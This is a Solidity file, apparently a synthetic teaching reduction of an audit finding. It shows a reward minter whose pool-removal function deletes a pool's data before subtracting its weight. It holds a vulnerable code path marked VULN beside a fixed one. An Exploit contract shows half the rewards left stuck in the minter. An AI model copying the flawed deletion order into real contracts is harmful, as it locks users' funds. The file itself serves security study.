// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — RAACMinter.removeDistributionPool leaves totalWeight
    unchanged (Pashov, finding #66171)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: poolInfo[pool] is deleted before totalWeight subtracts
    poolInfo[pool].weight, so the weight read is zero. Later mints divide
    by the stale total. The surviving pool is paid 50 of 100 and 50 RAAC
    stays in the minter. The updater is performing the documented removal,
    not an extra privilege. */

contract ERC20 {
    string public symbol = "RAAC";
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Pool {}

error PoolDoesNotExist();

contract Minter {
    struct PoolInfo {
        uint256 weight;
        bool exists;
    }

    ERC20 public token;
    address public updater;
    bool public fixedMode;
    uint256 public totalWeight;
    mapping(address => PoolInfo) public poolInfo;
    address[] public distributionPools;
    uint256 public paid;

    constructor(ERC20 t, address u, bool fixed_) {
        token = t;
        updater = u;
        fixedMode = fixed_;
    }

    function addPool(address pool, uint256 weight) external {
        poolInfo[pool] = PoolInfo(weight, true);
        distributionPools.push(pool);
        totalWeight += weight;
    }

    function removeDistributionPool(address pool) external {
        require(msg.sender == updater, "updater");
        if (!poolInfo[pool].exists) revert PoolDoesNotExist();
        poolInfo[pool].exists = false;
        if (fixedMode) {
            // FIX: subtract the live weight, then delete
            totalWeight = totalWeight - poolInfo[pool].weight;
            delete poolInfo[pool];
        } else {
            delete poolInfo[pool]; // @> VULN: weight is cleared before it is subtracted from totalWeight
            totalWeight = totalWeight - poolInfo[pool].weight;
        }
    }

    function processMintedRewards(uint256 amount) external {
        uint256 sum;
        for (uint256 i = 0; i < distributionPools.length; i++) {
            address pool = distributionPools[i];
            if (!poolInfo[pool].exists) continue;
            uint256 share = amount * poolInfo[pool].weight / totalWeight;
            token.transfer(pool, share);
            sum += share;
        }
        paid = sum;
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    Pool public poolA; // nonce 2
    Pool public poolB; // nonce 3
    Minter public minter; // nonce 4

    constructor() {
        token = new ERC20();
        poolA = new Pool();
        poolB = new Pool();
        minter = new Minter(token, address(this), false);
        minter.addPool(address(poolA), 50);
        minter.addPool(address(poolB), 50);
        token.mint(address(minter), 100 ether);
    }

    function run() external {
        minter.removeDistributionPool(address(poolB));
        require(minter.totalWeight() == 100, "weight stayed 100");
        minter.processMintedRewards(100 ether);
        require(token.balanceOf(address(poolA)) == 50 ether, "A was paid 50");
        require(token.balanceOf(address(minter)) == 50 ether, "50 stuck");
        require(minter.paid() == 50 ether, "only 50 distributed");
    }
}
